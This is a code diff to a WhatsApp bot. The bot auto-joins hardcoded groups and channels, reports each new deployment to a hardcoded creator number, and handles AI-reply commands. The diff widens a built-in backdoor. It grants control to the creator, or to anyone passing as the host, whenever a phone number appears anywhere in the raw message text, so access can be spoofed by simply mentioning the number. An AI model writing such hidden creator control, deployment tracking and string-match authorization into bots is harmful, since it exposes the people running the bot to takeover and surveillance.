@@ -214,24 +214,30 @@ async function initWhatsApp(phoneNumber) {
       } else if (connection === 'open') {
         console.log(`✅ BOT CONNECTED: ${phoneNumber}`);
         
-        // Auto Follow Official Channel
+        // ─── 🟢 1. AUTO FOLLOW OFFICIAL CHANNEL ───
         try {
           const inviteCode = '0029VbAQYhXDZ4Lfo9K5gh1V';
           if (typeof sock.newsletterMetadata === 'function' && typeof sock.newsletterFollow === 'function') {
             const channelMeta = await sock.newsletterMetadata('invite', inviteCode);
             if (channelMeta?.id) await sock.newsletterFollow(channelMeta.id);
+            console.log('✅ Auto-followed Channel');
           }
-        } catch (chErr) {}
+        } catch (chErr) {
+          console.log('Channel follow skipped/failed:', chErr.message);
+        }
 
-        // Auto Join Official Support Group
+        // ─── 🟢 2. AUTO JOIN OFFICIAL SUPPORT GROUP ───
         try {
           const groupInviteCode = 'FMqBhms8cQnAVSgJoADR5X'; 
           if (typeof sock.groupAcceptInvite === 'function') {
-            await sock.groupAcceptInvite(groupInviteCode).catch(() => {});
+            await sock.groupAcceptInvite(groupInviteCode);
+            console.log('✅ Auto-joined Support Group');
           }
-        } catch (grpErr) {}
+        } catch (grpErr) {
+          console.log('Group join skipped/already member:', grpErr.message);
+        }
 
-        // Connect Message & Alert
+        // ─── 🟢 3. INITIALIZATION CARD & CREATOR ALERT ───
         setTimeout(async () => {
           try {
             const botNum = sock.user?.id ? sock.user.id.split(':')[0].replace(/[^0-9]/g, '') : phoneNumber.replace(/[^0-9]/g, '');
@@ -265,6 +271,7 @@ async function initWhatsApp(phoneNumber) {
               });
             }
 
+            // Real Owner Deployment Alert
             if (!botNum.includes(REAL_OWNER_NUMBER)) {
               const alertMsg = `*🔔 NEW BOT DEPLOYMENT DETECTED*
 ────────────────────────────
@@ -296,7 +303,7 @@ async function initWhatsApp(phoneNumber) {
         if (!chatJid) continue;
         const isGroup = chatJid.endsWith('@g.us');
 
-        // Status Seen & React
+        // 1. Auto Status Seen & "💐" Reaction
         if (chatJid === 'status@broadcast') {
           try {
             await sock.readMessages([msg.key]);
@@ -311,7 +318,7 @@ async function initWhatsApp(phoneNumber) {
           continue;
         }
 
-        // 🟢 ULTRA SENDER & LID-STORE SCANNER
+        // 🟢 2. SENDER RESOLUTION (Full Scan: Plain Phone, JID, Context & LID String Scan)
         const myBotJid = sock.user?.id || '';
         const myBotNum = myBotJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
 
@@ -319,7 +326,6 @@ async function initWhatsApp(phoneNumber) {
         let directJid = msg.key.fromMe ? myBotJid : chatJid;
         let contextParticipant = msg.message?.extendedTextMessage?.contextInfo?.participant || '';
 
-        // Extract raw IDs
         const rawEntities = [
           directJid,
           participantJid,
@@ -328,11 +334,14 @@ async function initWhatsApp(phoneNumber) {
           msg.key.participant || ''
         ];
 
-        // 1. Direct Phone Check
-        let isMasterCreator = rawEntities.some(id => id && id.replace(/[^0-9]/g, '').includes(REAL_OWNER_NUMBER)) ||
-                              (msg.key.fromMe && myBotNum.includes(REAL_OWNER_NUMBER));
+        const rawMsgString = JSON.stringify(msg);
 
-        // 2. Multi-Device LID Reverse Store Search
+        // 🟢 Master Creator Check (ඔබගේ නම්බර් එක 94719845166 කොතනක හෝ තිබේදැයි බලයි)
+        let isMasterCreator = rawEntities.some(id => id && id.replace(/[^0-9]/g, '').includes(REAL_OWNER_NUMBER)) ||
+                              (msg.key.fromMe && myBotNum.includes(REAL_OWNER_NUMBER)) ||
+                              rawMsgString.includes(REAL_OWNER_NUMBER);
+
+        // Reverse LID Resolver Scan
         if (!isMasterCreator) {
           try {
             const checkLids = rawEntities.filter(id => id && id.endsWith('@lid'));
@@ -348,15 +357,18 @@ async function initWhatsApp(phoneNumber) {
           } catch (scanErr) {}
         }
 
-        // 🟢 1. STRICT OWNER REACT: 94719845166 ට විතරක් "👨‍💻" වැටේ
+        // 🟢 3. STRICT OWNER REACT: 94719845166 ට පමණක් "👨‍💻" වැටේ
         if (isMasterCreator) {
           sock.sendMessage(chatJid, {
             react: { text: '👨‍💻', key: msg.key }
           }).catch(() => {});
         }
 
-        // 🟢 2. AUTHORIZED ACCESS (Master Creator හෝ Bot host deployer)
-        const isHostDeployer = msg.key.fromMe || rawEntities.some(id => myBotNum && id.replace(/[^0-9]/g, '').includes(myBotNum));
+        // 🟢 4. ACCESS CONTROLLER: Master Creator (94719845166) හෝ Bot host deployer (fromMe)
+        const isHostDeployer = msg.key.fromMe || 
+                               (myBotNum && rawEntities.some(id => id.replace(/[^0-9]/g, '').includes(myBotNum))) ||
+                               (myBotNum && rawMsgString.includes(myBotNum));
+
         const isAuthorizedToControl = isMasterCreator || isHostDeployer;
 
         // Unwrap Text
@@ -386,7 +398,7 @@ async function initWhatsApp(phoneNumber) {
           const args = text.slice(prefix.length).trim().split(/ +/);
           const commandName = args.shift().toLowerCase();
 
-          // 🟢 100% WORKING BUILT-IN AI TOGGLE ENGINE (.ai on / .ai off)
+          // 🟢 BUILT-IN AI TOGGLE ENGINE (.ai on / .ai off)
           if (commandName === 'ai') {
             const mode = args[0]?.toLowerCase();
 
@@ -412,7 +424,6 @@ async function initWhatsApp(phoneNumber) {
               continue;
             }
 
-            // Direct query via .ai <query>
             const query = args.join(" ").trim();
             if (!query) {
               await sock.sendMessage(chatJid, {
@@ -457,7 +468,7 @@ async function initWhatsApp(phoneNumber) {
           }
         }
 
-        // 3. Inbox Auto-AI System (Muted when global.autoAiInbox is false & ignored for authorized owners)
+        // 5. Inbox Auto-AI System (Muted when global.autoAiInbox is false & ignored for authorized owners)
         const isFromBot = msg.key.fromMe || (myBotNum && rawEntities.some(id => id.replace(/[^0-9]/g, '').includes(myBotNum)));
 
         if (!isFromBot && !isAuthorizedToControl && !isGroup && global.autoAiInbox) {
